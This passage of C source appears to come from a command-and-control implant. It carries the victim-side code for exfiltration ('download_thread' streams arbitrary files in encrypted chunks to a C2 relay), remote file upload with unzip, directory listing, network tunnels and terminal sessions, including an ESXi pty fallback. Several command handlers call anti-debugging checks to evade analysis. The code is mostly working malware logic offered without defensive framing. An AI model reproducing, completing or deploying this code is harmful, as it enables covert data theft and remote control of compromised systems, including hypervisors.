    size_t size = 0;

    const char* content_ptr = "";

    if (content != NULL && content_len > 0) {

        content_ptr = (const char*)content;

    }

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 9);

    mpack_write_cstr(&writer, "id");

    mpack_write_i32(&writer, file_id);

    mpack_write_cstr(&writer, "path");

    mpack_write_cstr(&writer, path);

    mpack_write_cstr(&writer, "content");

    mpack_write_bin(&writer, content_ptr, content_len);

    mpack_write_cstr(&writer, "size");

    mpack_write_u64(&writer, total_size);

    mpack_write_cstr(&writer, "mtime");

    mpack_write_i64(&writer, mtime);

    mpack_write_cstr(&writer, "offset");

    mpack_write_u64(&writer, offset);

    mpack_write_cstr(&writer, "start");

    mpack_write_bool(&writer, start);

    mpack_write_cstr(&writer, "finish");

    mpack_write_bool(&writer, finish);

    mpack_write_cstr(&writer, "canceled");

    mpack_write_bool(&writer, canceled);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) return NULL;

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



Buffer* mpack_build_job(uint32_t command_id, const char* job_id, const Buffer* data) {

    mpack_writer_t writer;

    char* d = NULL;

    size_t size = 0;

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 3);

    mpack_write_cstr(&writer, "command_id");

    mpack_write_u32(&writer, command_id);

    mpack_write_cstr(&writer, "job_id");

    mpack_write_cstr(&writer, job_id);

    mpack_write_cstr(&writer, "data");

    mpack_write_bin(&writer, (const char*)data->data, data->len);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) return NULL;

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



Buffer* mpack_build_message(int type, Buffer** objects, int obj_count) {

    mpack_writer_t writer;

    char* d = NULL;

    size_t size = 0;

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 2);

    mpack_write_cstr(&writer, "type");

    mpack_write_i32(&writer, type);

    mpack_write_cstr(&writer, "object");

    mpack_start_array(&writer, obj_count);

    for (int i = 0; i < obj_count; ++i) {

        mpack_write_bin(&writer, (const char*)objects[i]->data, objects[i]->len);

    }

    mpack_finish_array(&writer);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) return NULL;

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



Buffer* mpack_build_start_msg(int type, const Buffer* data) {

    mpack_writer_t writer;

    char* d = NULL;

    size_t size = 0;

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 2);

    mpack_write_cstr(&writer, "id");

    mpack_write_i32(&writer, type); //INIT_PACK = 1 EXFIL_PACK = 2 JOB_PACK = 3

    mpack_write_cstr(&writer, "data");

    mpack_write_bin(&writer, (const char*)data->data, data->len);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) return NULL;

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



void init_downloads() {

    pthread_mutex_init(&downloads_mutex, NULL);

}



void add_download(const char* task_id, pthread_t thread) {

    pthread_mutex_lock(&downloads_mutex);

    DownloadEntry* entry = malloc(sizeof(DownloadEntry));

    entry->task_id = strdup(task_id);

    entry->thread = thread;

    HASH_ADD_KEYPTR(hh, downloads, entry->task_id, strlen(entry->task_id), entry);

    pthread_mutex_unlock(&downloads_mutex);

}



void remove_download_entry(const char* task_id) {

    LOG_INFO("enter remove_download_entry..................\n");

    pthread_mutex_lock(&downloads_mutex);

    DownloadEntry* entry;

    HASH_FIND_STR(downloads, task_id, entry);

    if (entry) {

        HASH_DEL(downloads, entry);

        free(entry->task_id);

        free(entry);

    }

    pthread_mutex_unlock(&downloads_mutex);

    LOG_INFO("pass remove_download_entry..................\n");

}



void stop_download(const char* task_id) {

    DownloadEntry* entry;

    pthread_mutex_lock(&downloads_mutex);

    HASH_FIND_STR(downloads, task_id, entry);

    if (entry) {

        pthread_cancel(entry->thread);

    }

    pthread_mutex_unlock(&downloads_mutex);

    remove_download_entry(task_id);

}



void cleanup_downloads() {

    DownloadEntry* entry, * tmp;

    HASH_ITER(hh, downloads, entry, tmp) {

        pthread_cancel(entry->thread);

        HASH_DEL(downloads, entry);

        free(entry->task_id);

        free(entry);

    }

}



void* download_thread(void* arg) {

    LOG_INFO("enter download_thread.................\n");

    //agent --> server

    DownloadArgs* args = (DownloadArgs*)arg;

    Buffer* exfil_pack = NULL;

    Buffer* exfil_msg = NULL;

    int fd = -1;

    int nSock = -1;

    unsigned char* buf = NULL;



    nSock = connect_c2_relay_fd();

    if (nSock < 0) {

        LOG_ERROR("Failed to connect");

        goto cleanup;

    }

    LOG_INFO("Relay connected for download (fd=%d)", nSock);







    uint32_t agent_type = 0x904e5493;

    exfil_pack = mpack_build_exfil_pack(g_agent_id, agent_type, args->task_id);







    if (!exfil_pack) goto cleanup;







    exfil_msg = mpack_build_start_msg(EXFIL_PACK, exfil_pack);







    if (!exfil_msg) goto cleanup;







    print_session_key("GLOBAL_KEY..............", GLOBAL_KEY, 16);

    send_packet_fd(nSock, exfil_msg->data, exfil_msg->len, GLOBAL_KEY);



    unsigned char session_key[32];





    if (session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

        fprintf(stderr, "Failed to get session key for type %d\n", PKT_TYPE_INIT_KEY);

        goto cleanup;

    }



    print_session_key("seesion_key..............", session_key, 16);



    uint64_t resume_offset = args->offset;

    int response_file_id = args->file_id;



    fd = open(args->path, O_RDONLY);

    if (fd < 0) goto cleanup;



    struct stat st;

    if (fstat(fd, &st) != 0) goto cleanup;

    uint64_t total_size = (uint64_t)st.st_size;

    int64_t file_mtime = (int64_t)st.st_mtime;



    if ((args->expect_size != 0 || args->expect_mtime != 0) &&

        (args->expect_size != total_size || args->expect_mtime != file_mtime)) {

        resume_offset = 0;

        response_file_id = (int)strtoul(args->task_id, NULL, 16);

        LOG_INFO("download identity changed, restarting from offset 0");

    }



    if (resume_offset > total_size) {

        resume_offset = total_size;

    }

    lseek(fd, (off_t)resume_offset, SEEK_SET);



    LOG_INFO("send file size=%llu, mtime=%lld\n", (unsigned long long)total_size, (long long)file_mtime);



    Buffer* start_download = mpack_build_ans_download(

        response_file_id,

        args->path,

        NULL,

        0,

        total_size,

        file_mtime,

        resume_offset,

        1,

        (resume_offset >= total_size),

        0

    );

    if (start_download) {

        Buffer* job = mpack_build_job(5, args->task_id, start_download);

        if (job) {

            Buffer* objects[1] = { job };

            Buffer* message = mpack_build_message(2, objects, 1);

            if (message) {

                send_packet_fd(nSock, message->data, message->len, session_key);

                free(message->data);

                free(message);

            }

            free(job->data);

            free(job);

        }

        free(start_download->data);

        free(start_download);

    }



    const size_t chunk_size = 0x100000;

    buf = malloc(chunk_size);



    for (uint64_t offset = resume_offset; offset < total_size; offset += chunk_size) {

        size_t read_size = chunk_size;

        if (offset + read_size > total_size) read_size = total_size - offset;

        ssize_t nread = read(fd, buf, read_size);

        if (nread < 0) {

            LOG_ERROR("read file failed: %s", strerror(errno));

            break;

        }

        if (nread == 0) {

            break;

        }

        read_size = (size_t)nread;



        int finish = (offset + read_size == total_size);



        Buffer* ans_download = mpack_build_ans_download(

            response_file_id,

            args->path,

            buf,

            read_size,

            total_size,

            file_mtime,

            offset,

            0,

            finish,

            0

        );

        if (!ans_download) continue;

        Buffer* job = mpack_build_job(5, args->task_id, ans_download);

        if (!job) { free(ans_download->data); free(ans_download); continue; }

        Buffer* objects[1] = { job };

        Buffer* message = mpack_build_message(2, objects, 1);

        if (!message) { free(job->data); free(job); free(ans_download->data); free(ans_download); continue; }



            LOG_INFO("send_packet data len=%d)\n", message->len);

        send_packet_fd(nSock, message->data, message->len, session_key);



        free(message->data);

        free(message);

        free(job->data);

        free(job);

        free(ans_download->data);

        free(ans_download);

        usleep(100000);

    }



cleanup:

    if (exfil_pack) { free(exfil_pack->data); free(exfil_pack); }

    if (exfil_msg) { free(exfil_msg->data); free(exfil_msg); }

    if (fd >= 0) { close(fd); }

    if (buf) { free(buf); }

    if (nSock >= 0) { close(nSock); }





    remove_download_entry(args->task_id);

    beacon_hold_leave("download");

    free(args->task_id); free(args->path); free(args);

    return NULL;

}



void* download_worker(void* arg) {

    LOG_INFO("enter download_worker..................\n");

    DownloadArgs* args = (DownloadArgs*)arg;

    LOG_INFO("enter download_worker..................1\n");

    //printf("Starting download %s from %s to %s,file_id = %d\n", args->task_id, args->path,args->file_id);

    if (args && args->task_id && args->path) {

        printf("Starting download %s from %s to %s, file_id = %d\n", args->task_id, args->path, "(null)", args->file_id);

    }

    else {

        LOG_ERROR("Invalid args in download_worker\n");

        return NULL;

    }

    LOG_INFO("enter download_worker..................2\n");

    download_thread(args);

    LOG_INFO("enter download_worker..................3\n");









    return NULL;

}



void start_download(const char* task_id, const char* path, int file_id, uint64_t offset, uint64_t expect_size, int64_t expect_mtime) {

    LOG_INFO("enter start_download..................\n");

    DownloadArgs* args = malloc(sizeof(DownloadArgs));

    pthread_t thread;

    int rc;

    args->task_id = strdup(task_id);



    args->path = strdup(path);

    args->file_id = file_id;

    args->offset = offset;

    args->expect_size = expect_size;

    args->expect_mtime = expect_mtime;

    beacon_hold_enter("download");

    rc = pthread_create(&thread, NULL, download_worker, (void*)args);

    if (rc != 0) {

        LOG_ERROR("pthread_create download_worker failed: %s", strerror(rc));

        beacon_hold_leave("download");

        free(args->task_id);

        free(args->path);

        free(args);

        return;

    }

    pthread_detach(thread);

    add_download(task_id, thread);

    LOG_INFO("pass start_download..................\n");

}



void handle_file_download_command(struct mg_connection *c, const file_download_command_t* cmd) {
    anti_debug_check_sensitive();

    (void)c;

    LOG_INFO("=== File Download Command ===");

    LOG_INFO("Task ID: %s", cmd->task);

    LOG_INFO("Path: %s", cmd->path);

    LOG_INFO("File ID: 0x%08x", cmd->file_id);

    LOG_INFO("Remote Path: %s", cmd->remote_path);

    LOG_INFO("Local Path: %s", cmd->local_path);

    LOG_INFO("Offset: %llu", (unsigned long long)cmd->offset);

    LOG_INFO("Length: %llu", (unsigned long long)cmd->length);

    LOG_INFO("============================");



    start_download(cmd->task, cmd->path, cmd->file_id, cmd->offset, cmd->expect_size, cmd->expect_mtime);

}



void build_download_start_ack(uint8_t** out_data, size_t* out_len, uint64_t task_id) {

    char* data = NULL;

    size_t size = 0;

    mpack_writer_t writer;





    mpack_writer_init_growable(&writer, &data, &size);





    mpack_start_map(&writer, 2);



    // type: 1

    mpack_write_cstr(&writer, "type");

    mpack_write_i32(&writer, 1);



    // object: array of 1 element

    mpack_write_cstr(&writer, "object");

    mpack_start_array(&writer, 1);





    mpack_start_map(&writer, 3);



    // code: 35 (COMMAND_TERMINAL_START)

    mpack_write_cstr(&writer, "code");

    mpack_write_u32(&writer, 5);







    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, task_id);





    // data: null

    mpack_write_cstr(&writer, "data");

    mpack_write_nil(&writer);



    mpack_finish_map(&writer);

    mpack_finish_array(&writer);

    mpack_finish_map(&writer);





    mpack_error_t err = mpack_writer_destroy(&writer);

    if (err != mpack_ok) {



        if (data) {

            MPACK_FREE(data);

        }

        *out_data = NULL;

        *out_len = 0;



        // fprintf(stderr, "mpack writer error: %d\n", err);

        return;

    }





    *out_data = (uint8_t*)data;

    *out_len = size;

}



void handle_download_start_task(struct mg_connection *c, uint32_t task_id) {



    LOG_INFO("=== handle_download_start_task ===");

    LOG_INFO("task_id ID: 0x%08x", task_id);

    LOG_INFO("=============================");



    uint8_t* ack_plain = NULL;

    size_t ack_plain_len = 0;





    build_download_start_ack(&ack_plain, &ack_plain_len, task_id);

    if (!ack_plain || ack_plain_len == 0) {

        printf("[ERROR] Failed to build ACK\n");

        return;

    }



    unsigned char session_key[32];





    if (session_key_get(PKT_TYPE_INIT_KEY, session_key, sizeof(session_key)) != 0) {

        fprintf(stderr, "Failed to get session key for type %d\n", PKT_TYPE_INIT_KEY);

        return;

    }



    print_session_key("File download response session key", session_key, 16);



    send_packet(c, (const uint8_t*)ack_plain, (uint32_t)ack_plain_len, session_key);



    LOG_INFO("File download response sent successfully");



    free(ack_plain);





}



typedef struct {

    char* path;

    char* staging_path;

    FILE* file;

    uint64_t offset;

    int realtime_held;

    UT_hash_handle hh;

} UploadEntry;



UploadEntry* uploads = NULL;



static void upload_close_file(UploadEntry* entry) {

    if (entry != NULL && entry->file != NULL) {

        fclose(entry->file);

        entry->file = NULL;

    }

}



// Upload entry helpers

UploadEntry* upload_entry_create(const char* path) {

    UploadEntry* entry;

    char staging_path[PATH_MAX];



    if (path == NULL || path[0] == '\0') return NULL;

    HASH_FIND_STR(uploads, path, entry);

    if (!entry) {

        if (build_upload_staging_path(path, staging_path, sizeof(staging_path)) != 0) {

            return NULL;

        }

        entry = malloc(sizeof(UploadEntry));

        if (entry == NULL) return NULL;

        memset(entry, 0, sizeof(UploadEntry));

        entry->path = strdup(path);

        entry->staging_path = strdup(staging_path);

        if (entry->path == NULL || entry->staging_path == NULL) {

            free(entry->path);

            free(entry->staging_path);

            free(entry);

            return NULL;

        }

        HASH_ADD_STR(uploads, path, entry);

    }

    return entry;

}



static void upload_realtime_enter(UploadEntry* entry) {

    if (entry == NULL) return;

    if (__sync_bool_compare_and_swap(&entry->realtime_held, 0, 1)) {

        beacon_hold_enter("upload");

    }

}



static tunnel_session_t* find_tunnel_session_nolock(int channel_id) {

    tunnel_session_t* session = NULL;

    HASH_FIND_INT(g_tunnel_sessions, &channel_id, session);

    return session;

}



static MAYBE_UNUSED tunnel_session_t* find_tunnel_session(int channel_id) {

    tunnel_session_t* session = NULL;

    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    session = find_tunnel_session_nolock(channel_id);

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);

    return session;

}



static MAYBE_UNUSED void add_tunnel_session(tunnel_session_t* session) {

    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    HASH_ADD_INT(g_tunnel_sessions, channel_id, session);

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);

}



static void remove_tunnel_session(tunnel_session_t* session) {

    pthread_mutex_lock(&g_tunnel_sessions_mutex);

    HASH_DEL(g_tunnel_sessions, session);

    pthread_mutex_unlock(&g_tunnel_sessions_mutex);

}



static void tunnel_session_release_hold(tunnel_session_t* session) {

    if (session == NULL) return;

    if (session->realtime_held) {

        beacon_hold_leave("tunnel");

        session->realtime_held = 0;

    }

}



static void tunnel_session_close_fds(tunnel_session_t* session) {

    if (session == NULL) return;

    if (session->relay_fd >= 0) {

        shutdown(session->relay_fd, SHUT_RDWR);

        close(session->relay_fd);

        session->relay_fd = -1;

    }

    if (session->target_fd >= 0) {

        shutdown(session->target_fd, SHUT_RDWR);

        close(session->target_fd);

        session->target_fd = -1;

    }

}



static void tunnel_session_request_stop(tunnel_session_t* session) {

    if (session == NULL) return;

    session->running = 0;

    session->paused = 0;

    tunnel_session_close_fds(session);

}



static void tunnel_session_destroy(tunnel_session_t* session) {

    if (session == NULL) return;

    tunnel_session_request_stop(session);

    session->exited = 1;

    tunnel_session_release_hold(session);

    remove_tunnel_session(session);

    free(session);

}



static void upload_realtime_leave(UploadEntry* entry) {

    if (entry == NULL) return;

    if (__sync_bool_compare_and_swap(&entry->realtime_held, 1, 0)) {

        beacon_hold_leave("upload");

    }

}



static void upload_entry_remove(UploadEntry* entry, int delete_staging) {

    if (entry == NULL) return;

    upload_realtime_leave(entry);

    upload_close_file(entry);

    if (delete_staging && entry->staging_path != NULL) {

        remove(entry->staging_path);

    }

    HASH_DEL(uploads, entry);

    free(entry->path);

    free(entry->staging_path);

    free(entry);

}



void upload_entries_cleanup() {

    UploadEntry* current, * tmp;

    HASH_ITER(hh, uploads, current, tmp) {

        upload_entry_remove(current, 0);

    }

}





Buffer* mpack_build_ans_upload(const char* path, uint64_t offset, int finish) {

    mpack_writer_t writer;

    char* d = NULL;

    size_t size = 0;

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 3);

    mpack_write_cstr(&writer, "path");

    mpack_write_cstr(&writer, path);

    mpack_write_cstr(&writer, "offset");

    mpack_write_u64(&writer, offset);

    mpack_write_cstr(&writer, "finish");

    mpack_write_bool(&writer, finish);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) {

        free(d);

        return NULL;

    }

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



Buffer* mpack_build_ans_error(const char* error_msg) {

    mpack_writer_t writer;

    char* d = NULL;

    size_t size = 0;

    mpack_writer_init_growable(&writer, &d, &size);

    mpack_start_map(&writer, 1);

    mpack_write_cstr(&writer, "error");

    mpack_write_cstr(&writer, error_msg);

    mpack_finish_map(&writer);

    if (mpack_writer_destroy(&writer) != mpack_ok) {

        free(d);

        return NULL;

    }

    Buffer* b = malloc(sizeof(Buffer));

    b->data = (unsigned char*)d;

    b->len = size;

    return b;

}



// Upload handler

void handle_file_upload_command(struct mg_connection *c, const file_upload_command_t* cmd) {
    anti_debug_check_sensitive();

    LOG_INFO("=== handle_file_upload_command ===");

    LOG_INFO("Agent ID: 0x%08x", cmd->header.agent_id);



    Buffer* ans = NULL;

    int resp_code = CMD_CODE_FILE_UPLOAD;

    UploadEntry* entry = upload_entry_create(cmd->path);

    uint64_t next_offset = cmd->offset;

    struct stat st;

    char err_buf[512] = { 0 };



    if (!entry) {

        build_upload_error(err_buf, sizeof(err_buf), "failed to allocate upload entry");

        ans = mpack_build_ans_error(err_buf);

        resp_code = 0;

        goto send_response;

    }



    upload_realtime_enter(entry);



    if (cmd->offset == 0) {

        upload_close_file(entry);

        if (entry->staging_path != NULL) {

            remove(entry->staging_path);

        }

        entry->file = fopen(entry->staging_path, "wb+");

        if (!entry->file) {

            build_upload_error(err_buf, sizeof(err_buf), "failed to create staging zip");

            ans = mpack_build_ans_error(err_buf);

            resp_code = 0;

            upload_entry_remove(entry, 1);

            goto send_response;

        }

        entry->offset = 0;

    } else {

        if (entry->file == NULL) {

            entry->file = fopen(entry->staging_path, "rb+");

            if (entry->file == NULL) {

                build_upload_error(err_buf, sizeof(err_buf), "staging zip is missing, restart upload from offset 0");

                ans = mpack_build_ans_error(err_buf);

                resp_code = 0;

                upload_entry_remove(entry, 1);

                goto send_response;

            }

        }



        if (stat(entry->staging_path, &st) != 0) {

            build_upload_error(err_buf, sizeof(err_buf), "failed to stat staging zip");

            ans = mpack_build_ans_error(err_buf);

            resp_code = 0;

            upload_entry_remove(entry, 1);

            goto send_response;

        }



        if ((uint64_t)st.st_size < cmd->offset) {

            build_upload_error(err_buf, sizeof(err_buf), "staging zip is shorter than resume offset");

            ans = mpack_build_ans_error(err_buf);

            resp_code = 0;

            upload_entry_remove(entry, 1);

            goto send_response;

        }

        if ((uint64_t)st.st_size > cmd->offset) {

            if (ftruncate(fileno(entry->file), (off_t)cmd->offset) != 0) {

                build_upload_error(err_buf, sizeof(err_buf), "failed to truncate staging zip");

                ans = mpack_build_ans_error(err_buf);

                resp_code = 0;

                upload_entry_remove(entry, 1);

                goto send_response;

            }

        }

        entry->offset = cmd->offset;

    }



    if (fseeko(entry->file, (off_t)cmd->offset, SEEK_SET) != 0) {

        build_upload_error(err_buf, sizeof(err_buf), "failed to seek staging zip");

        ans = mpack_build_ans_error(err_buf);

        resp_code = 0;

        upload_entry_remove(entry, 1);

        goto send_response;

    }



    if (cmd->content_len > 0) {

        size_t written = fwrite(cmd->content, 1, cmd->content_len, entry->file);

        if (written != cmd->content_len) {

            build_upload_error(err_buf, sizeof(err_buf), "failed to write staging zip");

            ans = mpack_build_ans_error(err_buf);

            resp_code = 0;

            upload_entry_remove(entry, 1);

            goto send_response;

        }

        next_offset = cmd->offset + written;

    }



    if (fflush(entry->file) != 0) {

        build_upload_error(err_buf, sizeof(err_buf), "failed to flush staging zip");

        ans = mpack_build_ans_error(err_buf);

        resp_code = 0;

        upload_entry_remove(entry, 1);

        goto send_response;

    }

    entry->offset = next_offset;



    if (!cmd->finish) {

        ans = mpack_build_ans_upload(cmd->path, next_offset, 0);

        goto send_response;

    }



    LOG_INFO("=== upload staging complete === %s", entry->staging_path);

    upload_close_file(entry);

    if (handle_file_unzip(entry->staging_path, entry->path, err_buf, sizeof(err_buf)) != 0) {

        char upload_err[640];

        build_upload_error(upload_err, sizeof(upload_err), err_buf);

        ans = mpack_build_ans_error(upload_err);

        resp_code = 0;

        upload_entry_remove(entry, 1);

        goto send_response;

    }



    ans = mpack_build_ans_upload(cmd->path, next_offset, 1);

    upload_entry_remove(entry, 1);



send_response:

    if (ans) {

        send_command_response(c, (uint32_t)resp_code, cmd->task_id, ans->data, ans->len);

        free(ans->data);

        free(ans);

    }

    free(cmd->content);

}



static void mode_to_string(mode_t mode, char* str) {

    str[0] = S_ISDIR(mode) ? 'd' :

        S_ISLNK(mode) ? 'l' :

        S_ISBLK(mode) ? 'b' :

        S_ISCHR(mode) ? 'c' :

        S_ISFIFO(mode) ? 'p' :

        S_ISSOCK(mode) ? 's' : '-';



    str[1] = (mode & S_IRUSR) ? 'r' : '-';

    str[2] = (mode & S_IWUSR) ? 'w' : '-';

    str[3] = (mode & S_IXUSR) ? 'x' : '-';

    str[4] = (mode & S_IRGRP) ? 'r' : '-';

    str[5] = (mode & S_IWGRP) ? 'w' : '-';

    str[6] = (mode & S_IXGRP) ? 'x' : '-';

    str[7] = (mode & S_IROTH) ? 'r' : '-';

    str[8] = (mode & S_IWOTH) ? 'w' : '-';

    str[9] = (mode & S_IXOTH) ? 'x' : '-';

    str[10] = '\0';

}



int execute_file_listdir(const file_listdir_command_t* cmd, response_listdir_t* resp) {

    DIR* dir = NULL;

    struct dirent* entry;

    struct stat st;

    char full_path[1024];



    memset(resp, 0, sizeof(response_listdir_t));

    resp->task_id = cmd->task_id;

    resp->command_code = CMD_CODE_FILE_LISTDIR;



    if (strcmp(cmd->path, "./") == 0) {

        if (getcwd(resp->path, sizeof(resp->path)) == NULL) {





            return -1;

        }

    }

    else {

        safe_strncpy(resp->path, cmd->path, sizeof(resp->path));

        resp->path[sizeof(resp->path) - 1] = '\0';

    }



    LOG_INFO("Executing listdir for path: [%s]", cmd->path);





    dir = opendir(cmd->path);

    if (!dir) {

        resp->result = 0;

        snprintf(resp->status, sizeof(resp->status),

            "Failed to open directory: %s", strerror(errno));

        LOG_ERROR("%s", resp->status);

        return -1;

    }





    size_t count = 0;

    while ((entry = readdir(dir)) != NULL) {

        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {

            continue;

        }

        count++;

    }

    rewinddir(dir);



    LOG_INFO("Found %zu entries in directory", count);





    if (count > 0) {

        resp->files = calloc(count, sizeof(file_info_t));

        if (!resp->files) {

            closedir(dir);

            resp->result = 0;

            snprintf(resp->status, sizeof(resp->status), "Out of memory");

            LOG_ERROR("Out of memory");

            return -1;

        }

    }





    resp->file_count = 0;

    while ((entry = readdir(dir)) != NULL && resp->file_count < count) {



        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {

            continue;

        }



        file_info_t* finfo = &resp->files[resp->file_count];





        safe_strncpy(finfo->filename, entry->d_name, sizeof(finfo->filename));





        snprintf(full_path, sizeof(full_path), "%s/%s", cmd->path, entry->d_name);





        if (lstat(full_path, &st) == 0) {



            finfo->size = st.st_size;





            finfo->is_dir = S_ISDIR(st.st_mode) ? 1 : 0;





            mode_to_string(st.st_mode, finfo->mode);





            finfo->nlink = st.st_nlink;





            snprintf(finfo->user, sizeof(finfo->user), "%u", (unsigned int)st.st_uid);

            snprintf(finfo->group, sizeof(finfo->group), "%u", (unsigned int)st.st_gid);



            /*



            struct passwd* pw = getpwuid(st.st_uid);

            if (pw) {

                safe_strncpy(finfo->user, pw->pw_name, sizeof(finfo->user));

            }

            else {

                snprintf(finfo->user, sizeof(finfo->user), "%d", st.st_uid);

            }





            struct group* gr = getgrgid(st.st_gid);

            if (gr) {

                safe_strncpy(finfo->group, gr->gr_name, sizeof(finfo->group));

            }

            else {

                snprintf(finfo->group, sizeof(finfo->group), "%d", st.st_gid);

            }

            */





            struct tm* timeinfo = localtime(&st.st_mtime);

            if (timeinfo) {

                strftime(finfo->date, sizeof(finfo->date), "%b %e %H:%M", timeinfo);

            }

            else {

                strcpy(finfo->date, "Unknown");

            }



            LOG_DEBUG("  [%zu] %s %s:%s %10lu %s %s",

                resp->file_count,

                finfo->mode,

                finfo->user,

                finfo->group,

                finfo->size,

                finfo->date,

                finfo->filename);

        }

        else {

            LOG_WARN("Failed to stat %s: %s", full_path, strerror(errno));



            strcpy(finfo->mode, "?---------");

            finfo->nlink = 0;

            strcpy(finfo->user, "?");

            strcpy(finfo->group, "?");

            finfo->size = 0;

            strcpy(finfo->date, "Unknown");

        }



        resp->file_count++;

    }



    closedir(dir);



    resp->result = 1;

    LOG_INFO("Listed %zu files in [%s]", resp->file_count, cmd->path);



    return 0;

}







int pack_file_listdir_response(const response_listdir_t* resp,

    uint8_t** out_buf, size_t* out_len) {

    char buffer[65536];  // 64KB buffer for files array

    mpack_writer_t writer;





    mpack_writer_init(&writer, buffer, sizeof(buffer));



    mpack_start_array(&writer, resp->file_count);



    for (size_t i = 0; i < resp->file_count; i++) {

        const file_info_t* finfo = &resp->files[i];



        mpack_start_map(&writer, 8);



        mpack_write_cstr(&writer, "mode");

        mpack_write_cstr(&writer, finfo->mode);



        mpack_write_cstr(&writer, "nlink");

        mpack_write_u32(&writer, finfo->nlink);



        mpack_write_cstr(&writer, "user");

        mpack_write_cstr(&writer, finfo->user);



        mpack_write_cstr(&writer, "group");

        mpack_write_cstr(&writer, finfo->group);



        mpack_write_cstr(&writer, "size");

        mpack_write_u64(&writer, finfo->size);



        mpack_write_cstr(&writer, "date");

        mpack_write_cstr(&writer, finfo->date);



        mpack_write_cstr(&writer, "filename");

        mpack_write_cstr(&writer, finfo->filename);



        mpack_write_cstr(&writer, "is_dir");

        mpack_write_bool(&writer, finfo->is_dir);



        mpack_finish_map(&writer);

    }



    mpack_finish_array(&writer);



    if (mpack_writer_destroy(&writer) != mpack_ok) {

        LOG_ERROR("Failed to pack file list");

        return -1;

    }



    size_t files_data_len = mpack_writer_buffer_used(&writer);



    LOG_DEBUG("Files array packed: %zu bytes", files_data_len);





    char resp_buffer[65536];

    mpack_writer_t resp_writer;

    mpack_writer_init(&resp_writer, resp_buffer, sizeof(resp_buffer));



    mpack_start_map(&resp_writer, 4);  // result, status, path, files



    mpack_write_cstr(&resp_writer, "result");

    mpack_write_bool(&resp_writer, resp->result);



    mpack_write_cstr(&resp_writer, "status");

    mpack_write_cstr(&resp_writer, resp->result ? "" : resp->status);



    mpack_write_cstr(&resp_writer, "path");

    mpack_write_cstr(&resp_writer, resp->path);



    mpack_write_cstr(&resp_writer, "files");

    mpack_write_bin(&resp_writer, buffer, files_data_len);



    mpack_finish_map(&resp_writer);



    if (mpack_writer_destroy(&resp_writer) != mpack_ok) {

        LOG_ERROR("Failed to pack response");

        return -1;

    }



    size_t resp_data_len = mpack_writer_buffer_used(&resp_writer);





    *out_len = resp_data_len;

    *out_buf = malloc(*out_len);

    if (!*out_buf) {

        LOG_ERROR("Out of memory");

        return -1;

    }



    memcpy(*out_buf, resp_buffer, resp_data_len);



    LOG_INFO("Packed listdir response (%zu bytes, %zu files)",

        *out_len, resp->file_count);



    return 0;

}







void free_listdir_response(response_listdir_t* resp) {

    if (resp && resp->files) {

        free(resp->files);

        resp->files = NULL;

        resp->file_count = 0;

    }

}











static int send_terminal_pack_on_socket(struct mg_connection* c, uint32_t term_id,

    unsigned char* session_key,

    unsigned char* iv) {

    unsigned char term_data[256];

    unsigned char outer_msg[512];

    unsigned int agent_id;

    mpack_writer_t writer;

    int data_len, outer_len;



    agent_id = get_agent_id();



    LOG_INFO("Sending TERMINAL_PACK (term_id=%u)", term_id);



    mpack_writer_init(&writer, (char*)term_data, sizeof(term_data));



    mpack_start_map(&writer, 6);



    mpack_write_cstr(&writer, "id");

    mpack_write_u32(&writer, agent_id);



    mpack_write_cstr(&writer, "term_id");

    mpack_write_u32(&writer, term_id);



    mpack_write_cstr(&writer, "key");

    mpack_write_bin(&writer, (const char*)session_key, 32);  // AES-256: 32 bytes



    mpack_write_cstr(&writer, "iv");

    mpack_write_bin(&writer, (const char*)iv, 16);



    mpack_write_cstr(&writer, "alive");

    mpack_write_bool(&writer, true);



    mpack_write_cstr(&writer, "status");

    mpack_write_cstr(&writer, "");



    mpack_finish_map(&writer);



    if (mpack_writer_destroy(&writer) != mpack_ok) {

        return -1;

    }



    data_len = (int)mpack_writer_buffer_used(&writer);



    mpack_writer_t outer_writer;

    mpack_writer_init(&outer_writer, (char*)outer_msg, sizeof(outer_msg));



    mpack_start_map(&outer_writer, 2);



    mpack_write_cstr(&outer_writer, "id");

    mpack_write_int(&outer_writer, MSG_TYPE_TERMINAL);



    mpack_write_cstr(&outer_writer, "data");

    mpack_write_bin(&outer_writer, (const char*)term_data, data_len);



    mpack_finish_map(&outer_writer);



    if (mpack_writer_destroy(&outer_writer) != mpack_ok) {

        return -1;

    }



    outer_len = (int)mpack_writer_buffer_used(&outer_writer);



    send_packet(c, outer_msg, outer_len, GLOBAL_KEY);



    LOG_INFO("TERMINAL_PACK sent successfully");

    return 0;

}



static int terminal_open_esxi_pty_fallback(TerminalNode* term, const struct winsize* ws,
    int* master_fd, int* slave_fd) {

    int local_master = -1;

    int slot;

    int busy_slots = 0;

    int reserved_any = 0;

    local_master = open("/dev/ptmx", O_RDWR | O_NOCTTY | O_NONBLOCK);

    if (local_master < 0) {

